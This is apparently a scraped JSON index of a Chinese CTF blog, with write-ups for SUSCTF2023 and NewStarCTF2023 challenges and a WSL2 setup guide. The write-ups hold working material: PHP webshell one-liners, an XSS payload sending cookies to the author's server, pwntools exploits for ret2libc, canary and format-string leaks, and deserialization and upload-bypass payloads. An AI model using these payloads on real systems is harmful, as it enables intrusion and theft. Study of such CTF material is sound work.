L7LuiUqP+8W4VFsl61lNZ5Y+vt24OxKh7PVu0/m98VYP/s7XuYr1fReft6FhUXXrBJgkUe1X+4Pe+0+U+6QRBcP683rfNfPpPqZ9V166xqXeQFWh6sd6sCf/H1a7v153vF2mhj4rJ9fVY81FoXZ9VF55ECfDirHltfW2er6782UbHbrFpnxfVfv7C2P4n6unxJ8uj8DH4XFy2p/SvvYfNeOT8L2+dX7Q+KAOKn9nmvXSf59OGz6PRZ9OGz59Nnzx8+i0+fxR8+ezl99vLhs+T0WfLhs/T0WXr9t3XG8rag2L/qRkj/mqf1GDpRVXzXVuH6CSAMqFZmA8P4rkcFgxoaASMwjZ4fvyvbbbRc5","date":"2023-10-16","objectID":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/:17:0","tags":["CTF","SUSCTF","WriteUp"],"title":"SUSCTF2023-东南大学校赛WriteUp","uri":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x01 pollute me 首先，根据题目的提示，该题目可能是一个nodejs原型链污染的题目。 原型链污染常常发生的地点是两个对象合并的时候。当相互合并的变量中有一个变量可控，我们就可以将__proto__赋值给合并的对象，从而造成原型链污染。 由于js对象之间存在继承关系，所以当我们要使用或者输出一个变量就会通过原型链向上搜索，当上层没有就会再向上上层搜索，直到指向 null，若此时还未找到就会返回 undefined。当我们成功加入__proto_的时候，就会影响所有来自于这个原型的对象。 直奔主题，审计app.js。这里直接找到了merge函数： 同时也找到了使用Merge函数的地方： merge的第二个参数req.body显然是我们可控的。只要在请求体中放入键值对应的json就可以实现污染。注意这里需要有个前提，就是结构体中的username字段必须等于存在的username（就是你注册的那个username）。 我们直接开始实操，首先需要注册用户： 这里为了方便将两个名字全部设为一样的。 接下来直接去修改信息。但是为了能修改请求体的内容（而且网页中并没有给我们提供修改username的接口），这里还是选择抓包： 将请求体改为： 原因是我们需要在eval中进行命令执行，参数就是eval_item： 这里提交修改，发现“姓名更新成功”后才能进行下一步（eval只有一次机会）。然后就直接访问/eval： 就可以看到flag了。 ","date":"2023-10-16","objectID":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/:18:0","tags":["CTF","SUSCTF","WriteUp"],"title":"SUSCTF2023-东南大学校赛WriteUp","uri":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x02 PHP Is All You Need 审计代码发现，接受的cmd参数可以直接命令执行，但是要求是字符小于20。 首先用ls看一下： 发现光flag文件的名称都14个字符了，再加上两个引号和括号和一个分号都21个字符了。很显然不能满足题目要求。 这里有几个技巧： Linux可以用\\拼接命令 可以用 ls -t按照时间顺序，后执行的排前面，于是可以拆分命令再拼接来实现。 可以用 ls -th，-h 不影响执行，但 ht- 就能排到 sl 前面去 这里的想法是写入一句话木马\u003c?php eval（$_GET[1]);到1.php中。 因为有不少标点符号，这里直接用base64编码，为PD9waHAgZXZhbCgkX0dFVFsxXSk7 写入的命令是：echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d\u003e1.php 这里我们需要用拼接符号连接，同时需要按照时间倒序排列，才能ls -t到正常的顺序。 最后ls -t \u003e0写入到0这个文件中，然后sh 0执行0即可。 于是payload为： \u003ehp \u003e1.p\\\\ \u003ed\\\u003e\\\\ \u003e\\ -\\\\ \u003ee64\\\\ \u003ebas\\\\ \u003e7\\|\\\\ \u003eXSk\\\\ \u003eFsx\\\\ \u003edFV\\\\ \u003ekX0\\\\ \u003ebCg\\\\ \u003eXZh\\\\ \u003eAgZ\\\\ \u003ewaH\\\\ \u003ePD9\\\\ \u003eo\\ \\\\ \u003eech\\\\ ls -t\u003e0 sh 0 依次输入执行20个命令，使用ls看一下： 发现1.php已经写入服务器，此时直接访问1.php，然后命令注入即可： 查看源码，发现flag： ","date":"2023-10-16","objectID":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/:19:0","tags":["CTF","SUSCTF","WriteUp"],"title":"SUSCTF2023-东南大学校赛WriteUp","uri":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x03 Lavish Pastebin 这题进去随便输入内容，发现html直接加载了原内容。于是怀疑是XSS。 这里输入\u003cscript\u003ealert(1);\u003c/script\u003e试一试，确实可以。 但是根据源码，发现加载了CSP策略。 这里的script-src是unsafe-inline，即代表可以加载内联的Javascript。 于是想到了window.location。这里由于xss平台不支持直接接受http请求数据，我选择在自己的vps上用nc监听。（ip隐藏了，效果如下所示） payload如下所示： \u003cscript\u003e location.href=\"http://49.51.**.***:8080/?f=\"+encodeURIComponent(document.cookie); \u003c/script\u003e 这里发现一个问题，就是执行完这个payload发现下面提交给机器人的按钮没有了。于是选择抓提交机器人的包，然后将含有payload的pastebin直接发送给机器人： POST /report HTTP/1.1 Host: game.ctf.seusus.com:31471 Content-Length: 35 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://game.ctf.seusus.com:31471 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.46 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://game.ctf.seusus.com:31471/paste/850ab8e7f7f1bc71c5219903ef6099cf Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 Connection: close id=f17835c73eced2b97b2ebc4f75b4abb2 将上方id换成含有payload的pastebin给机器人即可。 此时在服务器端等待，即可收到flag： ","date":"2023-10-16","objectID":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/:20:0","tags":["CTF","SUSCTF","WriteUp"],"title":"SUSCTF2023-东南大学校赛WriteUp","uri":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x04 why not play a game 题目提示得到最高分的时候即可获得flag，这里猜测flag可能就存在在js文件中。 搜索susctf即可找到flag。 ","date":"2023-10-16","objectID":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/:21:0","tags":["CTF","SUSCTF","WriteUp"],"title":"SUSCTF2023-东南大学校赛WriteUp","uri":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x05 easy_rce \u003c?php highlight_file(__FILE__); error_reporting(0); if(!empty($_GET)){ foreach ($_GET as $key=\u003e$value){ $key(\"\",$value); } } 看了下题目，实际上是可变变量的问题。在php中可变变量可以当作函数名来执行。 这里由于要求的参数第一位是\"\"，可供选择的函数很少。这里有一个函数是：create_function 这个函数存在一个漏洞，就是代码注入的问题： create_function()会创建一个匿名函数（lambda样式），同时create_function()函数会在内部执行 eval()，我们发现是执行了后面的return语句，属于create_function()中的第二个参数string $code位置。该函数即等价于下面的情况。 于是可以直接使用如下payload进行闭合，从而实现任意命令执行： create_function=return%20111;}...// 这里我是直接写入木马： create_function=return%20111;}fputs(fopen('shell.php','w'),'\u003c?php @eval($_POST[cmd]);?\u003e');// 这时直接用蚁剑连shell.php即可。 连接后在根目录发现flag。可是由于权限是700根本无法查看。 这里找了好久，终于在/tmp下找到了一个mycat程序，使用命令mycat /flag才可以读取flag中的文件。 ","date":"2023-10-16","objectID":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/:22:0","tags":["CTF","SUSCTF","WriteUp"],"title":"SUSCTF2023-东南大学校赛WriteUp","uri":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x06 sleep away 看见题目就知道是反序列化的题目。 这里发现注入点在safeeval中的__destrcut函数中，他会在对象销毁的时候自动执行。但是，命令执行的参数args_down会在反序列化wakeup的时候被清空为空数组。 于是这里想到要绕wakeup。这里常用的方法是修改对象中参数的个数为不合法的个数。但是试了一下发现根本没用，因为此时destruct也不执行了。 此时发现helper中的wakeup具有修改内容的功能。而且我们知道，当类嵌套类的时候，内部类的wakeup会先触发。这里我的思路就是evalsafe在内部，让其wakeup先修改args_down,然后将helper的youneed绑定（引用）到safeeval类的args_down上，通过turearg（不是truearg）修改args_down参数即可。 于是payload如下所示： \u003c?php highlight_file(__FILE__); class safeeval{ public $evalstr; public $args_down; function __construct ($e,$arg){ $this-\u003eevalstr=$e; $this-\u003eargs_down=$arg; } function __destruct() { $evalstr=(string)$this-\u003eevalstr; $evalstr($this-\u003eargs_down); } function __wakeup(){ echo 'eval wakeup'; $this-\u003eargs_down=[]; } } class helper{ public $youneed; public $turearg; public $thinkit; function __wakeup() { echo \"helper wakeup\"; $this-\u003eyouneed=$this-\u003eturearg; } } if($_GET['step1']==md5($_GET['step1'])){ echo \"zhi shi xue bao\"; unserialize($_GET['backdoor']); } else{ echo \"xue bao bi zui\"; } $a = new helper(); $b = new safeeval('system','ls'); $a-\u003ethinkit = \u0026$b; // var_dump($a-\u003ethinkit); $a-\u003eyouneed = \u0026$b-\u003eargs_down; // var_dump($a-\u003eyouneed); // $a-\u003eturearg = 'ls /'; $a-\u003eturearg = 'cat /f1agggg'; echo serialize($a); ?\u003e 这里将thinkit绑定$b只是为了方便测试，其实可以不绑定的，得到的结果就是： O:6:\"helper\":3:{s:7:\"youneed\";s:2:\"ls\";s:7:\"turearg\";s:12:\"cat /f1agggg\";s:7:\"thinkit\";O:8:\"safeeval\":2:{s:7:\"evalstr\";s:6:\"system\";s:9:\"args_down\";R:2;}} 哦对这里还有个md5的问题，由于php的弱类型比较特性，我们可以使用字符串开头为'0e’的md5值来绕过判定。这里存在一个自身和md5的开头都是0e的字符串，他就是: 0e215962017 填入step1即可完成。找到的flag如下： ","date":"2023-10-16","objectID":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/:23:0","tags":["CTF","SUSCTF","WriteUp"],"title":"SUSCTF2023-东南大学校赛WriteUp","uri":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x07 转瞬即逝 由于网页没有给什么有用的信息，查看源码： 发现密码需要和当前的时间戳的值相差在5之内就行。 想到负数也小于5啊，那么我们的密码可以稍微比当前时间大一点。 先在js中使用Date.parse(new Date())/1000;获取当前时间戳，然后再后面加个1填入即可。 登录之后只看到一闪而过的login success，但是此时并没有发现什么异常。 这时查看请求头： 发现服务器的set-cookie，虽然已经过期了，但是应该有什么信息。这里应该是JWT格式，直接扔到cyberchef中解密即可。 成功找到flag。 ","date":"2023-10-16","objectID":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/:24:0","tags":["CTF","SUSCTF","WriteUp"],"title":"SUSCTF2023-东南大学校赛WriteUp","uri":"/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"ret2libc 在解题之前先讲下32位和64位程序调用函数的区别： ","date":"2023-10-11","objectID":"/articles/2023/10/newstarctf2023-week2-pwn/:0:0","tags":["CTF","PWN","WriteUp"],"title":"NewStarCTF2023-Week2-Pwn","uri":"/articles/2023/10/newstarctf2023-week2-pwn/"},{"categories":["WriteUp"],"content":"32位调用方式 栈自顶而下分别是：被调函数，被调函数的返回地址，参数1，参数2，参数3（参数自右向左进入栈） ","date":"2023-10-11","objectID":"/articles/2023/10/newstarctf2023-week2-pwn/:1:0","tags":["CTF","PWN","WriteUp"],"title":"NewStarCTF2023-Week2-Pwn","uri":"/articles/2023/10/newstarctf2023-week2-pwn/"},{"categories":["WriteUp"],"content":"64位调用方式 前六个参数（如果有）依次存放在RDI，RSI，RDX，RCX，R8，R9上。如果还有参数，第七个参数开始，按照32位的方式放在栈上。 这题题意非常清晰，就是标准的ret2libc，因此也不做其他解释。 这里远程地址的libc和本地不一样，而且大概率本地的libc在库中找不到。于是我采用了本地调用本地libc的，远程查询libc库的方法来解题，libc库的版本已经标识在代码中。 这里提供本地的exploit from pwn import * context(arch = 'amd64', os = 'linux') context.log_level='debug' context.terminal = ['tmux','splitw','-h'] elf = ELF('./ret2libc') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') #r = remote('node4.buuoj.cn',29791) r = process('./ret2libc') puts_plt = elf.plt['puts'] puts_got = elf.got['puts'] main = elf.sym['main'] ret_addr = 0x400506 pop_rdi_ret = 0x400763 payload = cyclic(0x28) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main) r.sendafter(b'again\\n',payload) puts_addr = u64(r.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00')) info(hex(puts_addr)) #libc = libc6_2.27-3ubuntu1.5_amd64 libc_puts_addr = libc.sym['puts'] libc_system_addr = libc.sym['system'] libc_bs_addr = next(libc.search(b'/bin/sh\\x00')) libc_base = puts_addr - libc_puts_addr system_addr = libc_base + libc_system_addr bs_addr = libc_base + libc_bs_addr gdb.attach(r) payload = cyclic(0x28) + p64(ret_addr) + p64(pop_rdi_ret) + p64(bs_addr) + p64(system_addr) #gdb.attach(r) r.sendafter(b'again\\n',payload) r.interactive() canary 这题看到源码中printf就知道是canary泄露： 这里直接用printf(buf)泄露canay的值即可 exp: from pwn import * context.terminal = ['tmux','splitw','-h'] context(arch = 'amd64', os = 'linux') #context.log_level='debug' elf = ELF('./canary') r = remote('node4.buuoj.cn',26324) #r = elf.process() payload = '%11$p' #gdb.attach(r) r.sendafter(b'gift?\\n',payload) canary = int(r.recvuntil(b'S')[-17:-1],16) info(hex(canary)) backdoor = 0x401262 payload = cyclic(0x30 - 0x8) + p64(canary) + cyclic(8) + p64(backdoor) #gdb.attach(r) r.sendafter(b'magic\\n',payload) r.interactive() secret number 这题一开始的思路错了，以为就是rand构造相等的随机数，后来一想可能libc库不相同。 看到printf(buf)这里应该可以泄露secret的内容了。 但是这题还有个问题就是保护全开，包括PIE 但是题目可以多次泄露数据。这就好办了，先打印任意一条已知指令的地址，然后减去固定偏移就可以得到程序加载的基址，再一次溢出就可以直接泄露secret的地址了。 exp: from pwn import * from ctypes import * context.terminal = ['tmux','splitw','-h'] context(arch = 'amd64', os = 'linux') context.log_level='debug' r = remote('node4.buuoj.cn',28036) elf = ELF('./secretnumber') #r = elf.process() r.recvuntil(b'gift?(0/1)\\n') r.sendline(b'1') r.recvuntil(b\"What's it\\n\") r.send(b'%17$p') #使用的指令是main开头的指令，放在rbp的下两个位置 r.recvuntil(b'gift:\\n') base = int(r.recv(14),16) - 0x12f5 #这里算出基址 info(hex(base)) secret = base + 0x404c info(hex(secret)) r.recvuntil(b'gift?(0/1)\\n') r.sendline(b'1') r.recvuntil(b\"What's it\\n\") r.send(b'AAAAAAAA' + b'%10$sAAA' + p64(secret)) #注意这里一定要填充到8字节，否则出问题 r.recvuntil(b'AAAAAAAA') #gdb.attach(r) ans = u32(r.recv(4)) info(ans) r.sendlineafter(b'gift?(0/1)\\n','0') r.sendlineafter(b'number\\n',str(ans)) r.interactive() stack migration 比较标准的栈迁移，关于栈迁移的知识可以查看Cyberangel · 语雀 (yuque.com)师傅的笔记。 这种题目是标准的套路，就是他泄露给你的地址就是想让你将esp迁移的位置。然后你在该地址下面直接构造ROP就行了。有后门就一次ROP，没后门就先泄露libc再ROP一样的。 exp: from pwn import * context.terminal = ['tmux','splitw','-h'] context(arch = 'amd64', os = 'linux') context.log_level='debug' elf = ELF('./pwn') #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') libc = ELF('./libc.so.6') r = remote('node4.buuoj.cn',28124) #r = elf.process() puts_got = elf.got['puts'] puts_plt = elf.plt['puts'] main = 0x401200 pop_rdi = 0x401333 leave = 0x4012aa ret = 0x40101a payload = b'd' * 8 r.recvuntil(b'name:\\n') r.send(payload) r.recvuntil('you: ') leak = int(r.recv(14),16) info(hex(leak)) payload = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main) payload += b'a' * (0x50 - len(payload)) + p64(leak) + p64(leave) #gdb.attach(r) r.recvuntil(b'plz:\\n') r.send(payload) puts_addr = u64(r.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00')) info(hex(puts_addr)) libc_base = puts_addr - libc.sym['puts'] system_addr = libc_base + libc.sym['system'] bin_sh_str = libc_base + next(libc.search(b'/bin/sh\\x00')) info(hex(system_addr)) r.recvuntil(b'name:\\n') payload = b'd' * 8 r.send(payload) r.recvuntil(b'you: ') leak = int(r.recv(14),16) info(hex(leak)) #gdb.attach(r) ","date":"2023-10-11","objectID":"/articles/2023/10/newstarctf2023-week2-pwn/:2:0","tags":["CTF","PWN","WriteUp"],"title":"NewStarCTF2023-Week2-Pwn","uri":"/articles/2023/10/newstarctf2023-week2-pwn/"},{"categories":["WriteUp"],"content":"游戏高手 这里看到提示，要分数达到100000分才有答案。 那么就要找哪里记录的分数。F12查看资源，发现有一个app_v2.js的js文件很可疑，这里进去直接搜索100000，发现如下代码： //游戏结束 function gameover(){ if(gameScore \u003e 100000){ var xhr = new XMLHttpRequest(); xhr.open(\"POST\", \"/api.php\", true); xhr.setRequestHeader(\"Content-Type\", \"application/json\"); xhr.onreadystatechange = function() { if (xhr.readyState === 4 \u0026\u0026 xhr.status === 200) { var response = JSON.parse(xhr.responseText); alert(response.message); } }; var data = { score: gameScore, }; xhr.send(JSON.stringify(data)); } alert(\"成绩：\"+gameScore); gameScore=0; curPhase =PHASE_READY; hero = null; hero = new Hero(); } /**********游戏主引擎*********/ 这里用json送了一个gameScore给/api后台，看来就是gameScore记录的分数。为了简单获取答案，我直接修改gameScore的初始值即可。 由于js已经加载，在F12中的控制台中修改gameScore的值： 确认后，开游戏发下分数已经改变，这时候送死就能拿到答案： include 0。0 这题实际上很简单，但是之前的思路一直是错的。 要知道php://filter/这类伪协议在运行的时候本身就会进行一次urldecode，同时在浏览器中输入也会进行一次urldecode，也就是decode两次。 所以不需要更换其他方法，base64直接urlencode两次就可以拿到flag。 payload: php://filter/read=convert.%2562%2561%2573%2565%2536%2534-encode/resource=flag.php 得到flag //PD9waHAgLy9mbGFnezgwOWYxOWJjLWY3MDYtNGYyYi1hMDEwLTg2MGE3YjU5MDBkNH0K flag{809f19bc-f706-4f2b-a010-860a7b5900d4} ez_sql 这里做题的时候直接sqlmap一把梭就直接出结果了。 python sqlmap.py -u \"http://...\" -dbs python sqlmap.py -u \"http://...\" -D ctf --tables python sqlmap.py -u \"http://...\" -D ctf -T here_is_flag --dump Unserialize？ 看下对象，发现是cmd私有成员的RCE（在对象摧毁时发生）。 注意两点即可： 由于是private对象，需要encode后输出； php里面字符串不能包含$，考虑其他绕过方式 其他没啥好注意的，基础反序列化题目。 payload： \u003c?php class evil { private $cmd = \"c''at /th1s_1s_fffflllll4444aaaggggg\"; public function __destruct() { if(!preg_match(\"/cat|tac|more|tail|base/i\", $this-\u003ecmd)){ @system($this-\u003ecmd); } } } $a = new evil; echo urlencode(serialize($a)); ?\u003e 输出是： O%3A4%3A%22evil%22%3A1%3A%7Bs%3A9%3A%22%00evil%00cmd%22%3Bs%3A36%3A%22c%27%27at+%2Fth1s_1s_fffflllll4444aaaggggg%22%3B%7D 传入unser即可拿到flag Upload again 这题是有点恶心的，直到我想到上传.htaccess 这题的验证全在后端，经过多次实验主要有两个： 上传之后的后缀名有检测。这里常见的phps,php4,php5,php3,phtml,PhP等等可执行的文件都试过了没有用 对上传之后的文件内容有检查：目前发现的就是检查是否含有php或者\u003c?php 第二点好解决，使用下面内容然后改为.gif就可以绕过： GIF89a\u003cscript language=\"pHp\"\u003e@eval($_POST['shell']) \u003c/script\u003e 对于第一点，经我测试只能使用.htaccess改变php解析方式才行： AddType application/x-httpd-php .gif 将上述文件保存为.htaccess后上传，将.gif当错php脚本来解析。 这样就可以成功getshell！ R!!C!!E!! 看题就知道是RCE（废话） 进网页发现要扫描： 扫描过程就不说了，记得一定要j加-s 1.5不然buuctf扫不了。结果就是git泄露。 这里用githack直接下载文件，发现： 首先是bo0g1pop.php文件，这个是我们这题的主角： \u003c?php highlight_file(__FILE__); if (';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['star'])) { if(!preg_match('/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i',$_GET['star'])){ eval($_GET['star']); } } 看到/[^\\W]+\\((?R)?\\)/就明白是无参RCE。但是下面的闲置条件未免也太多了。 我们再看下start.sh，发现flag在根目录，名字就叫flag。 回到RCE，我们发现scandir没法用。但是我们迫切需要一个数组至少能让我储存路径（/flag）。 这里想了很久。最后发现getallheaders()，它可以返回一个数组，就是所有的请求头的内容。 这里，我们加入一个头zzz（这样可以排在最后，这是个铺垫），然后直接print_r试一试（var_dump也用不了）： 成功获取！接下来就是和scandir一样的思路。先array_reverse()直接放到数组的第一个，然后用pos()获取内容！ 接下来加上eval就是完全没限制的rce了。由于知道flag的位置了，这里简单点直接system('cat /flag');即可拿到答案： payload： bo0g1pop.php?star=eval(pos(array_reverse(getallheaders()))); zzz: system('cat /flag'); 当然由于没有限制，这里直接getshell也是可以的： zzz: fputs(fopen('shell.php','w'),'\u003c?php @eval($_POST[cmd]);?\u003e'); Week2-Web完结！ ","date":"2023-10-10","objectID":"/articles/2023/10/newstarctf2023-week2-web/:0:0","tags":["CTF","Web","WriteUp"],"title":"NewStarCTF2023-Week2-Web(AK)","uri":"/articles/2023/10/newstarctf2023-week2-web/"},{"categories":["WriteUp"],"content":"PZthon 首先放到Die里面查壳： 壳没查到，但是发现使用PyInstaller打包的，于是这题就是Python逆向的思路。由于网上所提供的大部分工具都对python3.9无效，我这里提供一个通杀的办法。 ","date":"2023-10-10","objectID":"/articles/2023/10/newstartctf2023-week2-reverse/:0:0","tags":["CTF","Reverse","WriteUp"],"title":"NewStartCTF2023-Week2-Reverse","uri":"/articles/2023/10/newstartctf2023-week2-reverse/"},{"categories":["WriteUp"],"content":"0x01 exe解包 这里使用的工具是pyinstxtractor，下载方法是： git clone https://github.com/extremecoders-re/pyinstxtractor.git 将待解包的exe放入同一个文件夹，然后运行： python pyinstxtractor.py test.exe 完成后，文件夹下面会有一个test.exe_extracted的文件夹（名字可能不同） 我们需要的文件是：（文件名）.pyc和struct.pyc 注意，这里可能没有pyc的后缀名，那么很可能是你使用的pyinstxtractor的版本过低，如果确认版本的话，请自行添加.pyc后缀。 ","date":"2023-10-10","objectID":"/articles/2023/10/newstartctf2023-week2-reverse/:1:0","tags":["CTF","Reverse","WriteUp"],"title":"NewStartCTF2023-Week2-Reverse","uri":"/articles/2023/10/newstartctf2023-week2-reverse/"},{"categories":["WriteUp"],"content":"0x02 补充magic number magic number是在pyc文件开头的一段表示python版本的数，解包出来的pyc文件很可能会magic number缺失，需要手动补全。有很多方法可以查到magic number，但是最简单的还是将struct.pyc文件开头的内容和PZthon.pyc对比下，将开头保证一致即可。 这题的magic number并没有确实，所以不需要补充。 E3字节前面的内容就是要补充的内容。 0x03 反编译为py 这里使用的工具是pycdc。需要从github上clone下使用cmake编译： zrax/pycdc: C++ python bytecode disassembler and decompiler (github.com) 这里提供一个编译好的版本： cw2k/pycdc_withExe: C++ python bytecode disassembler and decompiler (github.com) 使用方法就是 pycdc.exe PZthon.pyc \u003e PZthon.py 即可反编译。 这题的反编译源码是： # Source Generated with Decompyle++ # File: PZthon.pyc (Python 3.9) def hello(): art = '\\n ___ \\n // ) ) / / // ) ) // | | / / // | | \\\\ / / \\\\ / / \\n //___/ / / / // //__| | / / //__| | \\\\ / \\\\ / / \\n / ____ / / / // ____ / ___ | / / / ___ | / / \\\\/ / \\n // / / // / / // | | / / // | | / /\\\\ / / \\n// / /___ ((____/ / // | | / /____/ / // | | / / \\\\ / / \\n \\n / / // / / || / / // / / / / /__ ___/ || / | / / // ) ) \\n / / //____ || / / //____ / / / / || / | / / // / / \\n / / / ____ || / / / ____ / / / / || / /||/ / // / / \\n / / // ||/ / // / / / / ||/ / | / // / / \\n / /____/ / //____/ / | / //____/ / / /____/ / / / | / | / ((___/ / \\n' print(art) return bytearray(input('Please give me the flag: ').encode()) enc = [ 115, 121, 116, 114, 110, 76, 37, 96, 88, 116, 113, 112, 36, 97, 65, 125, 103, 37, 96, 114, 125, 65, 39, 112, 70, 112, 118, 37, 123, 113, 69, 79, 82, 84, 89, 84, 77, 76, 36, 112, 99, 112, 36, 65, 39, 116, 97, 36, 102, 86, 37, 37, 36, 104] data = hello() for i in range(len(data)): data[i] = data[i] ^ 21 if bytearray(enc) == data: print('WOW!!') else: print('I believe you can do it!') input('To be continue...') 这里发现，将env的每个值异或21后打印即可。 EXP如下： enc = [115,121,116,114,110,76,37,96,88,116,113,112,36,97,65,125,103,37,96,114,125,65,39,112,70,112,118,37,123,113,69,79,82,84,89,84,77,76,36,112,99, 112,36,65,39,116,97,36,102,86,37,37,36,104] for i in range(0,len(enc)): enc[i] = enc[i] ^ 21 print(bytearray(enc)) 输出如下： bytearray(b'flag{Y0uMade1tThr0ughT2eSec0ndPZGALAXY1eve1T2at1sC001}') ","date":"2023-10-10","objectID":"/articles/2023/10/newstartctf2023-week2-reverse/:2:0","tags":["CTF","Reverse","WriteUp"],"title":"NewStartCTF2023-Week2-Reverse","uri":"/articles/2023/10/newstartctf2023-week2-reverse/"},{"categories":["OS"],"content":"概述 先上效果图： 首先讲一下大概的配置流程： 安装WSL2，也就是Windows下的linux子系统，默认安装Ubuntu 22.04 安装zsh终端，和oh-my-zsh配置文件。 为了保证显示效果，安装powerline字体 安装Tmux终端复用工具，提升终端的工作效率 安装Tmux插件和主题，进行美化 上述步骤完成即可达到上图效果。 安装WSL2 现在的Win11（家庭版 版本10.0.22621 版本 22621）可以一条命令安装wsl2 + Ubuntu 22.04 LTS，无需其他任何操作。 wsl --install 等待安装、下载完重启即可。 重启后打开终端，下拉框选择Ubuntu，此时就会安装Ubuntu系统。期间会让你输入用户名和密码，这个就是你日后正常使用的用户。设置完则安装完成。 ","date":"2023-10-07","objectID":"/articles/2023/10/%E5%9C%A8win11%E4%B8%AD%E6%89%93%E9%80%A0%E8%BF%91%E4%B9%8E%E5%AE%8C%E7%BE%8E%E7%9A%84ubuntu%E7%BB%88%E7%AB%AF/:0:0","tags":["Linux","Ubuntu","美化","WSL2"],"title":"在Win11中打造近乎完美的Ubuntu终端","uri":"/articles/2023/10/%E5%9C%A8win11%E4%B8%AD%E6%89%93%E9%80%A0%E8%BF%91%E4%B9%8E%E5%AE%8C%E7%BE%8E%E7%9A%84ubuntu%E7%BB%88%E7%AB%AF/"},{"categories":["OS"],"content":"配置镜像源 首先打开文件/etc/apt/sources.list sudo vim /etc/apt/sources.list 将原有没有注释（#）的语句全部注释，打开清华源官网：ubuntu | 镜像站使用帮助 | 清华大学开源软件镜像站 | Tsinghua Open Source Mirror 确定版本后，将文本框中的内容复制粘贴到终端中（右键粘贴），保存，更新软件源： sudo apt-get update ","date":"2023-10-07","objectID":"/articles/2023/10/%E5%9C%A8win11%E4%B8%AD%E6%89%93%E9%80%A0%E8%BF%91%E4%B9%8E%E5%AE%8C%E7%BE%8E%E7%9A%84ubuntu%E7%BB%88%E7%AB%AF/:1:0","tags":["Linux","Ubuntu","美化","WSL2"],"title":"在Win11中打造近乎完美的Ubuntu终端","uri":"/articles/2023/10/%E5%9C%A8win11%E4%B8%AD%E6%89%93%E9%80%A0%E8%BF%91%E4%B9%8E%E5%AE%8C%E7%BE%8E%E7%9A%84ubuntu%E7%BB%88%E7%AB%AF/"},{"categories":["OS"],"content":"设置代理 因为windows中的代理不能应用于WSL，需要单独为linux设置代理，原理是利用http_proxy的变量。脚本如下： #!/bin/sh hostip=$(cat /etc/resolv.conf | grep nameserver | awk '{ print $2 }') wslip=$(hostname -I | awk '{print $1}') port=7890 PROXY_HTTP=\"http://${hostip}:${port}\" PROXY_SOCKS5=\"socks5://${HOST_IP}:${PROXY_PORT}\" set_proxy(){ export http_proxy=\"${PROXY_HTTP}\" export HTTP_PROXY=\"${PROXY_HTTP}\" export https_proxy=\"${PROXY_HTTP}\" export HTTPS_proxy=\"${PROXY_HTTP}\" export ALL_PROXY=\"${PROXY_SOCKS5}\" export all_proxy=${PROXY_SOCKS5} git config --global http.https://github.com.proxy ${PROXY_HTTP} git config --global https.https://github.com.proxy ${PROXY_HTTP} echo \"Proxy has been opened.\" } unset_proxy(){ unset http_proxy unset HTTP_PROXY unset https_proxy unset HTTPS_PROXY unset ALL_PROXY unset all_proxy git config --global --unset http.https://github.com.proxy git config --global --unset 